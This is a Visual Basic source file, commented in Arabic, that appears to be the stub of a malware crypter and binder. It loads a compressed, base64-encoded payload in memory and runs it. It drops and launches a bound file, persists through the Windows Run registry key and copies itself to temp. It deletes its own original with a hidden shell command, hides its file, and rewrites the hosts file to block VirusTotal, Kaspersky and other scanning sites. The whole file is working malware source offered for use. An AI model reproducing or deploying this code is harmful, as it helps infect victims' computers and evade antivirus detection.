
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.CompilerServices
Imports System.IO
Imports System.IO.Compression
Imports System.Text
Imports System.Reflection
Imports Microsoft.VisualBasic
Imports System.Collections
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Resources
Imports System
Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Threading

Module BTQnWhnjvMNjktQ
    Public servstring As String = "[serverstring]" ''سترنج بايتات السرفر
    Public copyserv As String = "[Falsecopyserv]" ''تفعيل او عدم تفعيل خاصيه النسخ
    Public copypth As String = Environ("[%temp%]") ''مسار النسخ
    Public copFolder As String = "[copFolder]" ''فولدر اضافى يمكن ازالته
    Public copynam As String = "[copynam]" ''اسم السرفر
    Public startup As String = "[startupfalse]" ''تفعيا او عدم تغعيل خاصيه الثبيت
    Public regname As String = "[serregname]" ''اسم مفتاح الريجرسترى للسرفر
    Public servsleep As String = "[falsesrvsleep]" ''تفعيل او عدم تفعيل تاخير عند تشغيل السرفر
    Public servsleeptime As String = "[srvsleeptime]" ''الوقت المراد تاخيره

    Public Binder As String = "[falsebind]" ''تفعيل او عدم تفعيل خاصيه الدمج
    Public bindstring As String = "[bindedstring]" ''سترنج بايتات الملف المدمج
    Public bindpth As String = Environ("[bindtemp]") ''مسار نسخ الملف المدمج
    Public bindname As String = "[bindname]" ''اسم الملف المدمج
    Public bindsleep As String = "[falsebndleep]" ''تفعيل او عدم تفعيل تاخير عند تشغيل الملف المدمج
    Public bindsleeptime As String = "[bndsleeptime]" ''الوقت المراد تاخيره

    Public block As String = "[falseblock]" ''تفعيل او اغلاقخاصيه  حظر المواقع
    Public melt As String = "[falsemelt]" ''تفعيل او اغلاق خاصيه الاذابه
    Public HIDEME As String = "[falsehide]" ''تفعيل او اغلاق خاصيه اخفاء الملف
  
    Sub Main()
        ''بدء الدمج وتشغيل الملف
        If Binder = "True" Then
            binderway()
        End If
        ''اخفاء السرفر 
        If HIDEME = "TRUE" Then
            Dim thread2 As New Threading.Thread(AddressOf hidemeexp)
            thread2.IsBackground = False
            thread2.Start()
        End If
        '''فى اغلب الاحوال يتم التعديل على ملف هوست فى حاله التشغيل مسئول ولكنها توفير الحجم  للستب افضل من الطريقه الثانيه
        If block = "True" Then
            blocksite()
        End If
        '''خاصيه الذوبان  لا اعتقد ان لها اهميه لانها عباره عن نسخ للسرفر فى التيمب ثم حذفه فقط ثم تشغيله من التيمب 
        If melt = "True" Then
            Melltgo(My.Computer.FileSystem.GetName(Application.ExecutablePath))
        End If
        ''''تثبيت فى الريجرسترى
        If startup = "True" Then
            addtoreg()
        End If
        '''نسخ السرفر ثم غلقه ثم تشغيله من مساره الجديد
        If copyserv = "True" Then
            Copytrue()
        End If
        If servsleep = "true" Then
            Threading.Thread.Sleep(servsleeptime * 1000)
        End If
        '''التشفير
        Dim Elm0D As Byte() = mMaoOpKsriYPYFYguDjCnmb(Convert.FromBase64String(servstring))
      
        '''يفضل استبدال نقطه الادخال برنبى او مت تشاء فط لا تضع الاثنين معا حتى لا يكون هناك اضافات  وزياده للحجم بدون فائده

        Dim ҘЊくくҘこϐほмめこм As System.Reflection.Assembly = System.Reflection.Assembly.Load(Elm0D)
        Dim お頂Џ頂まめШ頂Шл As MethodInfo = ҘЊくくҘこϐほмめこм.EntryPoint
        If お頂Џ頂まめШ頂Шл IsNot Nothing Then
            Dim Ầ予争亊こおЊḈまえ As Object = ҘЊくくҘこϐほмめこм.CreateInstance(お頂Џ頂まめШ頂Шл.Name)
            お頂Џ頂まめШ頂Шл.Invoke(Ầ予争亊こおЊḈまえ, Nothing)
        End If









    End Sub
    ''دمج ملف
    Public Function binderway()
        Try
            If File.Exists(bindpth & "\" & bindname) Then
                File.Delete(bindpth & "\" & bindname)
            End If
            File.WriteAllBytes(bindpth & "\" & bindname, mMaoOpKsriYPYFYguDjCnmb(SB(bindstring)))
            Threading.Thread.CurrentThread.Sleep(1000)
            If bindsleep = "true" Then
                Threading.Thread.Sleep(bindsleeptime * 1000)
            End If
            Process.Start(bindpth & "\" & bindname)
        Catch
        End Try
    End Function
    ''تثبيت الريجرسترى
    Public Function addtoreg()
       Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        If copyserv = "True" Then
            key.SetValue(regname, copypth & "\" & copFolder & "\" & copynam)
        Else
            key.SetValue(regname, Application.ExecutablePath)
        End If
        key.Close()
    End Function
    ''نسخ السرفر فى الملفات
    Public Function Copytrue()
        If Not My.Computer.FileSystem.FileExists(copypth & "\" & copFolder & "\" & copynam) Then
            If Not (Directory.Exists(copypth & "\" & copFolder)) Then
                Directory.CreateDirectory(copypth & "\" & copFolder)
            End If
            File.Copy(Application.ExecutablePath, copypth & "\" & copFolder & "\" & copynam)

            Thread.Sleep("3000")
            Process.Start(copypth & "\" & copFolder & "\" & copynam)
            Thread.Sleep("3000")
            Process.GetCurrentProcess.Kill()
        End If
    End Function
    ''اذابه ولككن لا اظن ان لها اهميه طالما ان هناك نسخ للسرفر يمكن وضع امر حذف للسرفر بعد نسخه وقتل العمليه الاساسيه  
    Public Function Melltgo(ByVal HGBFBF讲וh房h不者 As String)
        Dim 文אה个יh不者 As String = IO.Path.GetTempPath
        If Not Application.StartupPath = 文אה个יh不者.Remove(文אה个יh不者.LastIndexOf("\")) Then
            System.IO.File.Copy(Application.ExecutablePath, 文אה个יh不者 & HGBFBF讲וh房h不者)
            Process.Start(文אה个יh不者 & HGBFBF讲וh房h不者)
            System.IO.File.SetAttributes(文אה个יh不者 & "\" & HGBFBF讲וh房h不者, IO.FileAttributes.Hidden)
            Shell("cmd.exe /c del " & ChrW(34) & Application.ExecutablePath & ChrW(34) & " & exit", AppWinStyle.Hide)
            End
        End If
    End Function
    ''gzipcom
    Public Function mMaoOpKsriYPYFYguDjCnmb(ByVal bytData() As Byte) As Byte()
        Using oMS As New MemoryStream(bytData)
            Using oGZipStream As New GZipStream(oMS, CompressionMode.Decompress)
                Const TUvnjiCKUhMIVstSVPieJtr As Integer = 1024
                Dim grJSscjZvmKZRRHFJfMAWHZ As Integer = 0
                Do
                    ReDim Preserve bytData(grJSscjZvmKZRRHFJfMAWHZ + TUvnjiCKUhMIVstSVPieJtr - 1)
                    Dim QOwrKfOpimoETvVluAlKlcp As Integer = oGZipStream.Read(bytData, grJSscjZvmKZRRHFJfMAWHZ, TUvnjiCKUhMIVstSVPieJtr)
                    grJSscjZvmKZRRHFJfMAWHZ += QOwrKfOpimoETvVluAlKlcp
                    If QOwrKfOpimoETvVluAlKlcp < TUvnjiCKUhMIVstSVPieJtr Then
                        ReDim Preserve bytData(grJSscjZvmKZRRHFJfMAWHZ - 1)
                        Exit Do
                    End If
                Loop
                oGZipStream.Close()
            End Using
            oMS.Close()
        End Using
        Return bytData
    End Function
    ''حظر المواقع فى كلف الهوستس
    Private Sub blocksite()
        Dim 烟UוنהםiwGbلנ要3ח As String = Environment.GetFolderPath(Environment.SpecialFolder.System)

        Dim עyAuM个 As String = 烟UוنהםiwGbلנ要3ח & "\" & "drivers" & "\" & "etc" & "\\" & "hosts"

        Dim writer As New StreamWriter(עyAuM个)
        writer.Write("127.0.0.1 www.virustotal.com")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 virustotal.com")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 novirusthanks.org")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 vscan.novirusthanks.org")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 virusscan.jotti.org")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 www.virusscan.jotti.org")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 virscan.org")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 www.virscan.org")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 virus-trap.org")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 www.virus-trap.org")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 filterbit.com")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 www.filterbit.com")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 viruschief.com")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 www.viruschief.com")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 kaspersky.com")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 www.kaspersky.com")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 metascan-online.com")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 www.metascan-online.com")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 nodistribute.com")
        writer.Write(Environment.NewLine)
        writer.Write("127.0.0.1 www.nodistribute.com")
        writer.Dispose()
    End Sub
    ''تحويل من سترنج لبايت
    Function SB(ByVal s As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    ''اخفاء السرفر لا اظن ان لها اهميه
    Sub hidemeexp()
        Try
            File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden)
        Catch
        End Try
    End Sub
End Module


